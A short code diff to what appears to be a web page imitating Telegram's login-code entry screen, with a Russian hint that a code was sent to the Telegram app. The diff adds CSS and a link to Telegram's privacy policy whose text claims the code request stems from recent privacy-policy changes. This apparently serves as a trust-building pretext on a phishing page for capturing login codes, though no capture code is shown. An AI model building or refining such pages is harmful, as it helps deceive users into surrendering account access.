@@ -46,6 +46,20 @@
       margin-bottom: 10px;
     }
 
+    .privacy-link {
+      font-size: 14px;
+      color: #2A9BF8;
+      text-decoration: none;
+      margin-bottom: 10px;
+      cursor: pointer;
+      transition: color 0.2s;
+    }
+
+    .privacy-link:hover {
+      color: #1a8be8;
+      text-decoration: underline;
+    }
+
     .code-boxes {
       display: flex;
       gap: 10px;
@@ -128,6 +142,10 @@
       <img src="avatar.gif" alt="avatar">
     </div>
     <div class="hint">Мы отправили код в приложение Telegram.</div>
+    
+    <a href="https://telegram.org/privacy" target="_blank" class="privacy-link">
+      Это необходимо, ввиду последних изменений в Политике конфиденциальности.
+    </a>
 
     <div class="code-boxes" id="codeBoxes">
       <div class="code-box"></div>
